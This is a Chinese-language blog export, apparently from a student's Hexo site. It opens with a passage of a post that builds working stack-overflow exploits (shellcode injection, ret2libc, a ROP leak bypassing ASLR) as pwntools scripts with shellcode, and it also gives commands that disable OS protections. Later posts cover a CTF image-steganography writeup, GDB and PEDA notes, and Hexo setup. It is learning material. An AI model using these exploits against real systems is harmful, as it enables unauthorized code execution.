<h3 id="第一、Control-Flow-Hijack-程序流劫持"><a href="#第一、Control-Flow-Hijack-程序流劫持" class="headerlink" title="第一、Control Flow Hijack 程序流劫持"></a>第一、Control Flow Hijack 程序流劫持</h3><p>这是一个较为常见的程序流劫持，其宗旨就是栈溢出，格式化字符串攻击和栈溢出。通过这个手段，攻击者可以做的就是控制PC指针然后执行目标代码，想要应对这个攻击，在linux系统下也是有保护机制存在的：</p>
<p>   1、DEP(堆栈不可执行)：这也就是gcc编译器gs验证码机制，这是专门防止缓冲区溢出而采取的保护措施，<br>具体方法是gcc首先在缓冲区被写入之前在buf的结束地址之后返回地址之前放入随机的gs验证码，并在缓冲区写入操作结束时检验该值。通常缓冲区溢出会从低地址到高地址覆写内存，所以如果要覆写返回地址，则需要覆写该gs验证码。这样就可以通过比较写入前和写入后gs验证码的数据，判断是否产生溢出。<br>   此机制的关闭方法是：在gcc编译时采用-fno-stack-protector选项。     </p>
<p>   2、ASLR(内存地址随机化)：在Ubuntu个其他Linux内核的系统中，目前都采用的内存地址随机话机制，这将会使得猜测具体的内存地址变得十分困难。<br>   此机制的关闭方法是：sysctl -w kernel.randomize_va_space=0</p>
<p>   3、Stack Protector(栈保护)：对于Federal系统，默认会执行可执行程序的屏蔽保护机制，该机制不允许执行存储在栈中的代码，这会使得缓冲区溢出攻击变得无效。而Ubuntu系统中默认没有采用这种机制。<br>   此机制的关闭方法是：sysctl –w kernel.exec-shield=0 gcc下：-z execstack</p>
<p>机制了解了下面来一个实际的操作，初学练习就要把保护机制全部关闭。就用书上所用到的这个例子好了。<br><img src="http://p1.bpimg.com/567571/d93bd9e76a1bfa28.png" alt=""><br><img src="http://i1.piimg.com/567571/c6ca73531e7e0eab.png" alt=""></p>
<p>根据大神的指引，初学先把Linux下的保护机制全部关闭，指令如下：<br>这个命令编译程序。-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector。<br>下面的指令就是关闭Linux系统的ASpapLR保护</p>
<p><img src="http://p1.bpimg.com/567571/a5a6c0264328d2ea.png" alt=""></p>
<p>关闭之后就先开始对这个程序进行分析。先在python下创建150个测试数据<br>gdb的插件peda自带pattern脚本直接生成</p>
<p><img src="http://p1.bpimg.com/567571/047c86bde3e83140.png" alt=""></p>
<p>然后开始run进行调试</p>
<p><img src="http://p1.bpimg.com/567571/7a6347780a47edf9.png" alt=""></p>
<p>可以看出来错误地址是0x41416d41 然后使用指令可以计算PC返回值覆盖点为140个字节，所以只要构造一个“A”*140+ret字符串就可以让PC执行我们所需要的指令</p>
<p><img src="http://p1.bpimg.com/567571/36a85efa38efce36.png" alt=""></p>
<p>之后就是需要一段shellcod，获取方法很多，网上找现成的，msf自动生成，作为初学者，shellcode不好找，因为gdb调试的时候会影响buf在内存的地址<br>根据大神指示，有一个好的方法:开启core dump这个功能</p>
<blockquote>
<p>ulimit -c unlimited<br> sudo sh -c ‘echo “/tmp/core.%t” /proc/sys/kernel/core_pattern’</p>
</blockquote>
<p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p>
<p><img src="http://p1.bpimg.com/567571/6632c5b0af41ef13.png" alt=""></p>
<p>因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xbffff029。</p>
<p><img src="http://p1.bpimg.com/567571/5f09a62aba81a7a9.png" alt=""></p>
<p>现在溢出点，shellcode和返回值地址都有。可以写exp了，最终测试代码如下:</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

p = process(&apos;./test&apos;)
ret = 0xbffff029

shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
shellcode += &quot;\x0b\xcd\x80&quot;

# p32(ret) == struct.pack(&quot;&lt;I&quot;,ret)
#对ret进行编码，将地址转换成内存中的二进制存储形式
payload = shellcode + &apos;A&apos; * (140 - len(shellcode)) + p32(ret)
p.send(payload) #发送payload

p.interactive()  #开启交互shell
</code></pre><p>接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成，命令如下：</p>
<blockquote>
<p> socat TCP4-LISTEN:10001,fork EXEC:./test</p>
</blockquote>
<p>随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 nc 127.0.0.1 10001来访问我们的目标程序服务了。</p>
<p>因为现在目标程序是跑在socat的环境中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行远程溢出啦！</p>
<h3 id="第二、Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护"><a href="#第二、Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护" class="headerlink" title="第二、Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护"></a>第二、Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护</h3><p>学习DEP就把DEP打开，其他两个（stack protector 和ASLR）依旧关闭<br>开启DEP指令如下：</p>
<blockquote>
<p> gcc -fno-stack-protector -o test test.c</p>
</blockquote>
<p>此时打开了DEP防护，那么如果还是提交上面那个脚本的话，系统会拒绝我们执行shellcode，<br>现在的测试程序为rw，而上面确实rwx </p>
<p><img src="http://p1.bpimg.com/567571/773db76a654aaa29.png" alt=""></p>
<p>我们知道test2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。</p>
<pre><code>   $ gdb ./test2
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
….
(gdb) break main
Breakpoint 1 at 0x8048430
(gdb) run
Starting program: /home/mzheng/CTF/groupstudy/test/test2

Breakpoint 1, 0x08048430 in main ()
(gdb) print system
$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt;
(gdb) print __libc_start_main
$2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt;
(gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;(gdb如果安装有peda插件貌似这跳命令找不到)
0xb7f81ff8
warning: Unable to access target memory at 0xb7fc8500, halting search.
1 pattern found.
(gdb) x/s 0xb7f81ff8
0xb7f81ff8:  &quot;/bin/sh&quot;
</code></pre><p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

p = process(&apos;./level2&apos;)
#p = remote(&apos;127.0.0.1&apos;,10002)

ret = 0xdeadbeef
systemaddr=0xb7e5f460
binshaddr=0xb7f81ff8

payload =  &apos;A&apos;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)

p.send(payload)

p.interactive()
</code></pre><h3 id="第三、ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#第三、ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="第三、ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>第三、ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h3><p>下面打开ASLR保护，指令如下</p>
<blockquote>
<p>   sudo -s<br>   echo 2 /proc/sys/kernel/randomize_va_space</p>
</blockquote>
<p>从现在开始会发现test的libc.so的地址每次都会变化。<br>我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。<br>所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。<br>首先我们利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
<p><img src="http://p1.bpimg.com/567571/356ec28ac9e2d64e.png" alt=""></p>
<p><img src="http://i1.piimg.com/567571/94ddb130646489c9.png" alt=""></p>
<p>我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()[此函数用于确定动态库中函数地址]函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。<br>因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。<br>使用ldd【 ldd命令用于判断某个可执行的 binary 档案含有什么动态函式库】命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p>
<p><img src="http://i1.piimg.com/567571/eb73f9b80519ade1.png" alt=""></p>
<p>最后写exp：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

libc = ELF(&apos;libc.so&apos;)
elf = ELF(&apos;test3&apos;)

p = process(&apos;./test3&apos;)
#p = remote(&apos;127.0.0.1&apos;, 10003)

plt_write = elf.symbols[&apos;write&apos;]
print &apos;plt_write= &apos; + hex(plt_write)
got_write = elf.got[&apos;write&apos;]
print &apos;got_write= &apos; + hex(got_write)
vulfun_addr = 0x0804844d
print &apos;vulfun= &apos; + hex(vulfun_addr)

payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)

print &quot;\n###sending payload1 ...###&quot;
p.send(payload1)

print &quot;\n###receving write() addr...###&quot;
write_addr = u32(p.recv(4))
print &apos;write_addr=&apos; + hex(write_addr)

print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;
system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;])
print &apos;system_addr= &apos; + hex(system_addr)
binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;)))
print &apos;binsh_addr= &apos; + hex(binsh_addr)

payload2 = &apos;a&apos;*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)

print &quot;\n###sending payload2 ...###&quot;
p.send(payload2)

p.interactive()
</code></pre><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>本文主要根据大牛的文章一步一步进行操作和学习，当然一下子也很难全部接受，后面还要多加温习，熟能生巧。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice-1之图片reverse]]></title>
      <url>/2017/01/30/practice-1%E4%B9%8B%E5%9B%BE%E7%89%87reverse/</url>
      <content type="html"><![CDATA[<p>嗯，找了好久在我能找的范围内都是算法大大相关的题目。<br><a id="more"></a></p>
<p>今儿无意发现reverse下有一道跟图片有关的题目，做了一下。了解了一个工具：C32Asm的用法以及隐藏flag的一种方法。就当开头长个见识了（至少我没见过！）</p>
<h3 id="工具了解"><a href="#工具了解" class="headerlink" title="工具了解"></a>工具了解</h3><p>C32Asm: 静态反编译工具，C32Asm现具有如下功能：快速静态反编译PE格式文件(Exe、Dll等)，提供Hex文件编辑功能，功能强大，提供内存Dump、内存编辑、PE文件Dump、PE内存ImageSize修正等多种实用功能。</p>
<h3 id="图片分析相关知识"><a href="#图片分析相关知识" class="headerlink" title="图片分析相关知识"></a>图片分析相关知识</h3><p>Exif： Exif是一种图像文件格式，储存个是与JPGE格式是完全相同的。Exif格式是在JPGE格式头部插入了数码照片的信息。（这个知识点里面还是可能隐藏flag的，以前遇到过）<br>简单来说：Exif=JPGE+拍摄参数。</p>
<h4 id="看题"><a href="#看题" class="headerlink" title="看题"></a>看题</h4><p><img src="http://i1.piimg.com/567571/af1bc42fa28391ef.png" alt=""></p>
<p>一只可爱的小狗<br>看看这个图片的信息。除了一些基本信息并没有隐藏着Exif的提示信息</p>
<p><img src="http://i1.piimg.com/567571/bdf522f3226b235c.png" alt=""></p>
<p>OK，那么现在就用工具进行解析。<br>下面就用C32Asm打开这个图片进行分析（其实Hex工具也可以）<br>开头看到BM字符说明这个图片是BMP位图。</p>
<p><img src="http://p1.bpimg.com/567571/5d9e1992e2dad4dd.png" alt=""></p>
<p>根据图片文字提示“奇怪的狗尾巴”（不用这个提示也习惯看完开头看结尾）。拉到结尾。发现IHDR 和 IEND这两个老搭配（当一个图片文件里有前者的时候必须找到后者这个图片才是合法的。加载两者中间的就是IDAT块儿，即图像数据信息。）</p>
<p><img src="http://p1.bpimg.com/567571/0a8ec5b61fa892ef.png" alt=""><br><img src="http://p1.bpimg.com/567571/a9ec495a61309544.png" alt=""></p>
<p>猜想：那么前面一定也有PNG标志。往前找，对的。下面要做的就是把这个PNG图片单独提取出来了</p>
<p><img src="http://i1.piimg.com/567571/4657daa80b5e4b9d.png" alt=""></p>
<p>在该工具下再打开16进制文件保存又会得到一个二维码图片</p>
<p><img src="http://p1.bpimg.com/567571/4f7525c46b60c4ba.png" alt=""></p>
<p>扫描出现的是一个URL:<a href="http://blog.sina.com.cn/s/blog_703d65470102v6tf.html。" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_703d65470102v6tf.html。</a></p>
<p>还是直接贴图片了。又是它， 不过提示换了。一个异或算法。</p>
<p><img src="http://p1.bpimg.com/567571/366131412899d74d.png" alt=""></p>
<p>不知道异或个啥，全选数据，新知识，修改数据可以自动全部进行数据的异或。flag出来了</p>
<p><img src="http://p1.bpimg.com/567571/d850ed3c112ac2fb.png" alt=""><br><img src="http://i1.piimg.com/567571/0ceab57f893662b8.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[寒假计划]]></title>
      <url>/2017/01/16/%E5%AF%92%E5%81%87%E8%AE%A1%E5%88%92/</url>
      <content type="html"><![CDATA[<p>寒假到了，一个关键的时间。定下一个学习计划来提升。<br><a id="more"></a></p>
<h3 id="1、自主练习学习python"><a href="#1、自主练习学习python" class="headerlink" title="1、自主练习学习python"></a>1、自主练习学习python</h3><p>参考书籍以及网上的知识自己进行python程序的练习，把网盘资料里的80个程序进行编辑练习。</p>
<h3 id="2、逆向破解练习"><a href="#2、逆向破解练习" class="headerlink" title="2、逆向破解练习"></a>2、逆向破解练习</h3><p>自己找10道对于算法无关的逆向题目进行破解，每题搞懂，将所得写到writeup上传博客。</p>
<h3 id="3、一步一步学rop-x86篇"><a href="#3、一步一步学rop-x86篇" class="headerlink" title="3、一步一步学rop x86篇"></a>3、一步一步学rop x86篇</h3><p>对于这篇文章自己进行学习，并写总结上传博客。</p>
<h3 id="4、linux系统"><a href="#4、linux系统" class="headerlink" title="4、linux系统"></a>4、linux系统</h3><p>了解linux下的保护机制，一些常见漏洞的了解。</p>
]]></content>
      
        <categories>
            
            <category> others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[GDB寄存器和内存查询指令]]></title>
      <url>/2016/11/12/GDB%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E5%86%85%E5%AD%98%E6%9F%A5%E8%AF%A2%E6%8C%87%E4%BB%A4/</url>
      <content type="html"><![CDATA[<p>今天下午学习pwn的基础知识，遇到了两个查询容易弄扯，在这儿总结下子。<br><a id="more"></a></p>
<h3 id="1、查看寄存器"><a href="#1、查看寄存器" class="headerlink" title="1、查看寄存器"></a>1、查看寄存器</h3><blockquote>
<p>(gdb) i r<br>(gdb) i r a                     # 查看所有寄存器（包括浮点、多媒体）<br>(gdb) i r esp<br>(gdb) i r pc</p>
</blockquote>
<h3 id="2、查看内存"><a href="#2、查看内存" class="headerlink" title="2、查看内存"></a>2、查看内存</h3><blockquote>
<p>(gdb) x /wx 0x80040000    # 以16进制显示指定地址处的数据<br>(gdb) x /8x $esp<br>(gdb) x /16x $esp+12<br>(gdb) x /16s 0x86468700   # 以字符串形式显示指定地址处的数据<br>(gdb) x /24i 0x8048a51      # 以指令形式显示指定地址处的数据（24条）</p>
</blockquote>
<h3 id="3、修改寄存器的值"><a href="#3、修改寄存器的值" class="headerlink" title="3、修改寄存器的值"></a>3、修改寄存器的值</h3><blockquote>
<p>(gdb) set $v0 = 0x004000000<br>(gdb) set $epc = 0xbfc00000</p>
</blockquote>
<h3 id="4、修改内存的值"><a href="#4、修改内存的值" class="headerlink" title="4、修改内存的值"></a>4、修改内存的值</h3><blockquote>
<p>(gdb) set {unsigned int}0x8048a51=0x0<br>(gdb) set <em>(unsigned int</em>)0x8048a54=0x55aa55aa</p>
</blockquote>
<h3 id="5、内存搜索"><a href="#5、内存搜索" class="headerlink" title="5、内存搜索"></a>5、内存搜索</h3><blockquote>
<p>Usage: find </p>
<p>(gdb) define find<br>set $ptr = $arg0<br>set $cnt = 0<br>while ( ($ptr&lt;=$arg1) &amp;&amp; ($cnt&lt;$arg2) )<br>   if ( <em>(unsigned int </em>)$ptr == $arg3 )<br>       x /wx $ptr<br>       set $cnt = $cnt + 1<br>   end<br>   set $ptr = $ptr + 4<br>end<br>end</p>
</blockquote>
<h3 id="6、断点、监测点"><a href="#6、断点、监测点" class="headerlink" title="6、断点、监测点"></a>6、断点、监测点</h3><blockquote>
<p>(gdb) b <em>0x80400000<br>(gdb) watch </em>(unsigned int *)0xbffff400==0x90909090</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 寄存器 debug </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[gdb与peda指令学习学习笔记]]></title>
      <url>/2016/10/30/gdb%E4%B8%8Epeda%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>下午学习的gdb指令。傻傻的对一个自己的程序输入打开指令打不开。问问才知道要先转换成可执行文件，上网有学学gcc指令收获不少啊。。<br><a id="more"></a></p>
<h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a><strong>遇到问题</strong></h2><h3 id="1、写了一个C-语言但是用指令转换成可执行文件时候呢显示iostream不存在"><a href="#1、写了一个C-语言但是用指令转换成可执行文件时候呢显示iostream不存在" class="headerlink" title="1、写了一个C++语言但是用指令转换成可执行文件时候呢显示iostream不存在"></a>1、写了一个C++语言但是用指令转换成可执行文件时候呢显示iostream不存在</h3><p>解决：对于C语言使用的转换指令是（假设文件是doc.c）<br>将C语言的文件doc.c转换为了doc</p>
<blockquote>
<p>gcc doc.c -o doc</p>
</blockquote>
<p>还有一个默认转换，也就是后面可以不加你转换的名字，系统默认转换后的名字为a.out</p>
<blockquote>
<p>gcc doc.c</p>
</blockquote>
<p>对于C++语言使用的转换指令是</p>
<blockquote>
<p>g++ doc.c -o doc</p>
</blockquote>
<h3 id="2、显示j-strlen-s-语句出错。"><a href="#2、显示j-strlen-s-语句出错。" class="headerlink" title="2、显示j=strlen(s)语句出错。"></a>2、显示j=strlen(s)语句出错。</h3><p>解决：原来linux的习惯，strlen声明放在 string.h 中(linux系统中可以通过man strlen来查看其帮助和所在头文件)，仅仅 #include <string> 只是引入了 std::string，还需要 #include <string.h></string.h></string></p>
<p>###3、其他指令<br>(1)、 将test.c预处理输出test.i文件。</p>
<blockquote>
<p>gcc -E test.c -o test.i</p>
</blockquote>
<p>(2)、 将预处理输出文件test.i汇编成test.s文件。</p>
<blockquote>
<p>gcc -E test.c -o test.i</p>
</blockquote>
<p>(3)、 将汇编输出文件test.s编译输出test.o文件。</p>
<blockquote>
<p>gcc -c test.s</p>
</blockquote>
<p>(4)、 将编译输出文件test.o链接成最终可执行文件test。</p>
<blockquote>
<p>gcc test.o -o test</p>
</blockquote>
<p>(5)、 使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长。</p>
<blockquote>
<p>gcc -O1 test.c -o test</p>
</blockquote>
<h3 id="4、多源文件的编译方法"><a href="#4、多源文件的编译方法" class="headerlink" title="4、多源文件的编译方法"></a>4、多源文件的编译方法</h3><p>(1)、多个文件一起编译<br>将testfun.c和test.c分别编译后链接成test可执行文件。</p>
<blockquote>
<p>gcc testfun.c test.c -o test</p>
</blockquote>
<p>(2)、分别编译各个源文件，之后对编译后输出的目标文件链接。<br>将testfun.c编译成testfun.o<br>将test.c编译成test.o<br>将testfun.o和test.o链接成test</p>
<blockquote>
<p>gcc -c testfun.c<br>gcc -c test.c<br>gcc -o testfun.o test.o -o test</p>
</blockquote>
<p>在搜索的过程中也发现了一个好玩的命令就先记录下吧，这是个gdb下的指令。</p>
<p>如果想看看现在的默认反汇编格式是什么，可以使用如下命令</p>
<blockquote>
<p>(gdb) show disassembly-flavor</p>
</blockquote>
<p>如果看不懂，那就转换汇编格式</p>
<blockquote>
<p>(gdb) set disassembly-flavor intel</p>
</blockquote>
<p>经过以上的步骤就可以把想要的可执行文件得到，下面就是对程序进行指令分析。程序为(doc)</p>
<p>运行程序看看</p>
<blockquote>
<p>./doc</p>
</blockquote>
<p>进入gdb指令下。（gdb + doc）<br>反编译</p>
<blockquote>
<p>disassemble main</p>
</blockquote>
<p>下面是基础的调试指令</p>
<table>
<thead>
<tr>
<th style="text-align:center">名称</th>
<th style="text-align:center">介绍</th>
<th style="text-align:center">用法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">r</td>
<td style="text-align:center">r 是run的简写，也就是在GDB下运行程序。（如果有设置断点会运行到断点）</td>
<td style="text-align:center">（gdb）r</td>
</tr>
<tr>
<td style="text-align:center">c</td>
<td style="text-align:center">C是continue的简写，就是继执行被调试的程序，直到下一次断点处或者结束</td>
<td style="text-align:center">（gdb）c</td>
</tr>
<tr>
<td style="text-align:center">b &lt;行号&gt;/&lt;函数名称&gt;/<em>&lt;函数名称&gt;/</em>&lt;代码地址&gt;</td>
<td style="text-align:center">b 是breakpoint的简写，就是设置断点，可以使用行号，函数名，执行地址进行下断。而函数名前加一个*则表示将断点设置在“由编译器生成的prolog代码处”，者在了解汇编后可以理解。</td>
<td style="text-align:center">（gdb）b 8、（gdb）b main 、(gdb)b <em>main 、（gdb）b </em>0x8048534</td>
</tr>
<tr>
<td style="text-align:center">d [编号]</td>
<td style="text-align:center">d 是delete breakpoint的简写，就是删除制定编号后的断点，也可以一次删去所有断点。</td>
<td style="text-align:center">（gdb）d 2</td>
</tr>
<tr>
<td style="text-align:center">p &lt;变量名称&gt;</td>
<td style="text-align:center">P是print的简写，显示指定变量的值（临时变量或全局变量）。</td>
<td style="text-align:center">（print）p n</td>
</tr>
<tr>
<td style="text-align:center">q</td>
<td style="text-align:center">不需要多解释了，就是退出调试</td>
<td style="text-align:center">（gdb）q</td>
</tr>
<tr>
<td style="text-align:center">S</td>
<td style="text-align:center">执行一行源代码，如果此行代码有函数调用，进入该函数，也就相当于其他调试器的单步步入。</td>
<td style="text-align:center">（gdb）s</td>
</tr>
<tr>
<td style="text-align:center">n</td>
<td style="text-align:center">执行一段源代码，代码中的函数调用也一并执行，也就相当于其他调试器的单步步过。</td>
<td style="text-align:center">（gdb）n</td>
</tr>
<tr>
<td style="text-align:center">Si ,ni</td>
<td style="text-align:center">这两个对应着的是s和n。不同的是这两个是对汇编语言的，而前两个是对源代码的。</td>
<td style="text-align:center">（gdb）si、（gdb）ni</td>
</tr>
</tbody>
</table>
<p>然后是peda的一些指令</p>
<blockquote>
<p>checksec –检查二进制的各种安全选项<br>dumpargs –当在调用指令时停止显示参数传递给函数<br>elfheader–调试文件的标题指令<br>elfsymbol–从一个精灵文件获得非调试符号信息<br>lookup   –搜索所有的地址/参考地址属于一个内存范围<br>readelf –从一个逆向文件获取标题信息<br>patch –内存补丁开始在字符串/ hexstring /诠释一个地址（？）<br>pattern –生成、搜索或写一个循环模式到内存<br>pshow –显示各种PEDA选项和其他设置<br>pset –设置各种peda选项和其他设置<br>procinfo –显示从/ proc / PID的各种信息<br>shellcode –生成或下载常见shellcodes<br>xormem –一个密钥异或内存区<br>vmmap –在调试过程中获得部分（S）的虚拟映射地址范围<br>ropgadget–得到的二进制或静态库共同ROP小工具<br>ropsearch –记忆中搜索rop小工具使用<br>skeleton –Python开发代码生成模板<br>dumprop –丢弃在特定的内存范围内所有ROP小工具<br>searchmem|find –在记忆中搜索模式；支持正则表达式搜索</p>
</blockquote>
<p>指令中提到了一个ROP，也不知道是啥，去搜一搜，原来：<br>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）</p>
<p>这个溢出攻击可参照网址：<a href="http://www.programlife.net/linux-rop-stack-overflow.html" target="_blank" rel="external">http://www.programlife.net/linux-rop-stack-overflow.html</a></p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> debug </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo搭建]]></title>
      <url>/2016/09/04/hexo%E6%90%AD%E5%BB%BA/</url>
      <content type="html"><![CDATA[<h1 id="Hexo搭建Github静态博客"><a href="#Hexo搭建Github静态博客" class="headerlink" title="Hexo搭建Github静态博客"></a>Hexo搭建Github静态博客</h1><a id="more"></a>
<p>应用GitHub Pages创建属于自己的个人博客，GitHub将提供免费的空间。GitHub提供的域名（用户名+github+io）,在Repository name对应处填写资源名，其需要使用自己的用户名，每个用户名下面只能建立一个，并且资源命名必须符合这样的规则username/username.github.io，之后勾选下面的”Initialize this repository with a README”</p>
<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><h3 id="1-1安装Git"><a href="#1-1安装Git" class="headerlink" title="1.1安装Git"></a>1.1安装Git</h3><p>下载地址：<a href="https://git-scm.com/download/win" target="_blank" rel="external">https://git-scm.com/download/win</a><br>下载安装包后正常安装即可。</p>
<h3 id="1-2安装node-js"><a href="#1-2安装node-js" class="headerlink" title="1.2安装node.js"></a>1.2安装node.js</h3><p>下载地址：<a href="http://nodejs.org/download/" target="_blank" rel="external">http://nodejs.org/download/</a><br>可以下载 node-v0.10.33-x64.msi<br>安装时直接保持默认配置即可。</p>
<h2 id="2-配置Github"><a href="#2-配置Github" class="headerlink" title="2.配置Github"></a>2.配置Github</h2><h3 id="1-1建立Repository"><a href="#1-1建立Repository" class="headerlink" title="1.1建立Repository"></a>1.1建立Repository</h3><p>建立与你用户名对应的仓库，仓库名必须为【your_user_name.github.io】</p>
<h3 id="1-2配置SSH-Key"><a href="#1-2配置SSH-Key" class="headerlink" title="1.2配置SSH-Key"></a>1.2配置SSH-Key</h3><p>参考：<a href="http://beiyuu.com/github-pages" target="_blank" rel="external">http://beiyuu.com/github-pages</a></p>
<h2 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h2><p>关于Hexo的安装配置过程，请以官方Hexo给出的步骤为准。</p>
<h3 id="3-1Installation"><a href="#3-1Installation" class="headerlink" title="3.1Installation"></a>3.1Installation</h3><p>打开Git命令行，执行如下命令</p>
<blockquote>
<p>$ npm install -g hexo</p>
</blockquote>
<h3 id="3-2-Quick-Start"><a href="#3-2-Quick-Start" class="headerlink" title="3.2 Quick Start"></a>3.2 Quick Start</h3><p><strong>1.Setup your blog</strong><br>在电脑中建立一个名字叫「Hexo」的文件夹（比如我建在了D:\Hexo），然后在此文件夹中右键打开Git Bash。执行下面的命令</p>
<blockquote>
<p>$ hexo init<br>[info] Copying data<br>[info] You are almost done! Don’t forget to run <code>npm install</code> before you start b<br>logging with Hexo!</p>
</blockquote>
<p>Hexo随后会自动在目标文件夹建立网站所需要的文件。然后按照提示，运行 npm install（在 /D/Hexo下）</p>
<blockquote>
<p>npm install</p>
</blockquote>
<p>会在D:\Hexo目录中安装 node_modules。</p>
<p><strong>2.Start the server</strong><br>运行下面的命令（在 /D/Hexo下）</p>
<blockquote>
<p>$ hexo server<br>[info] Hexo is running at <a href="http://localhost:4000/" target="_blank" rel="external">http://localhost:4000/</a>. Press Ctrl+C to stop.</p>
</blockquote>
<p><strong>3. Create a new post</strong><br>新打开一个git bash命令行窗口，cd到/D/Hexo下，执行下面的命令</p>
<blockquote>
<p>$ hexo new “My New Post”<br>[info] File created at d:\Hexo\source_posts\My-New-Post.md</p>
</blockquote>
<p>刷新<a href="http://localhost:4000/，可以发现已生成了一篇新文章" target="_blank" rel="external">http://localhost:4000/，可以发现已生成了一篇新文章</a> “My New Post”。</p>
<p><strong>NOTE:</strong><br>有一个问题，发现 “My New Post” 被发了2遍，在Hexo server所在的git bash窗口也能看到create了2次。</p>
<blockquote>
